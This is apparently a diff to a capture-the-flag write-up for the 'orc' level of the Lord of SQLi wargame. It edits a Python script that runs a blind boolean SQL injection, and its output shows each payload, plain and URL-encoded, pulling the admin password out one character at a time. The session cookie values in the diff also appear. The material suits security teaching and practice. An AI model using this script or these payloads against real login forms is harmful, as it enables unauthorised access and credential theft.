@@ -175,7 +175,7 @@ import requests
 import urllib.parse
 import string
 
-cookies = {'PHPSESSID': 'jeae4igtrh2cq92r63ob4kqmqr'}
+cookies = {'PHPSESSID': 'jkvees84mr4jq3nallg9rum7he'}
 url = "https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php"
 password_length = 0
 
@@ -192,8 +192,8 @@ for x in range(0, 10):
 
 print()    
 print(f"[!] Payload: ?pw={payload}")
+print(f"[!] Payload (URL encoded): ?pw={encoded_payload}")
 print(f"[!] Password length: {password_length}")
-print()
 
 password = ""
 searchspace = string.digits + string.ascii_letters
@@ -208,7 +208,9 @@ for index in range(1, password_length + 1):
 
     if "Hello admin" in response.text:
       password += char
+      print()
       print(f"[+] Payload: ?pw={payload}")
+      print(f"[+] Payload (URL encoded): ?pw={encoded_payload}")
       print(f"[+] Character at index {index}: {char}")
       break
 
@@ -221,27 +223,43 @@ print(f"[!] Final payload: ?pw={password}")
 $ python .\orc_script.py
 
 [!] Payload: ?pw=' OR id='admin' AND length(pw)=8 -- -
+[!] Payload (URL encoded): ?pw=%27+OR+id%3D%27admin%27+AND+length%28pw%29%3D8+--+-
 [!] Password length: 8
 
 [+] Payload: ?pw=' OR id='admin' AND substr(pw, 1, 1)='0' -- -
+[+] Payload (URL encoded): ?pw=%27+OR+id%3D%27admin%27+AND+substr%28pw%2C+1%2C+1%29%3D%270%27+--+-
 [+] Character at index 1: 0
+
 [+] Payload: ?pw=' OR id='admin' AND substr(pw, 2, 1)='9' -- -
+[+] Payload (URL encoded): ?pw=%27+OR+id%3D%27admin%27+AND+substr%28pw%2C+2%2C+1%29%3D%279%27+--+-
 [+] Character at index 2: 9
+
 [+] Payload: ?pw=' OR id='admin' AND substr(pw, 3, 1)='5' -- -
+[+] Payload (URL encoded): ?pw=%27+OR+id%3D%27admin%27+AND+substr%28pw%2C+3%2C+1%29%3D%275%27+--+-
 [+] Character at index 3: 5
+
 [+] Payload: ?pw=' OR id='admin' AND substr(pw, 4, 1)='a' -- -
+[+] Payload (URL encoded): ?pw=%27+OR+id%3D%27admin%27+AND+substr%28pw%2C+4%2C+1%29%3D%27a%27+--+-
 [+] Character at index 4: a
+
 [+] Payload: ?pw=' OR id='admin' AND substr(pw, 5, 1)='9' -- -
+[+] Payload (URL encoded): ?pw=%27+OR+id%3D%27admin%27+AND+substr%28pw%2C+5%2C+1%29%3D%279%27+--+-
 [+] Character at index 5: 9
+
 [+] Payload: ?pw=' OR id='admin' AND substr(pw, 6, 1)='8' -- -
+[+] Payload (URL encoded): ?pw=%27+OR+id%3D%27admin%27+AND+substr%28pw%2C+6%2C+1%29%3D%278%27+--+-
 [+] Character at index 6: 8
+
 [+] Payload: ?pw=' OR id='admin' AND substr(pw, 7, 1)='5' -- -
+[+] Payload (URL encoded): ?pw=%27+OR+id%3D%27admin%27+AND+substr%28pw%2C+7%2C+1%29%3D%275%27+--+-
 [+] Character at index 7: 5
+
 [+] Payload: ?pw=' OR id='admin' AND substr(pw, 8, 1)='2' -- -
-[+] Character at index 8: 2     
+[+] Payload (URL encoded): ?pw=%27+OR+id%3D%27admin%27+AND+substr%28pw%2C+8%2C+1%29%3D%272%27+--+-
+[+] Character at index 8: 2
 
 [!] Extracted password: 095a9852
-[!] Final payload: ?pw=095a9852 
+[!] Final payload: ?pw=095a9852
 ```
 
 ![8](https://github.com/Kunull/Write-ups/assets/110326359/ef9ae213-af29-4450-8d2e-34d02565e928)
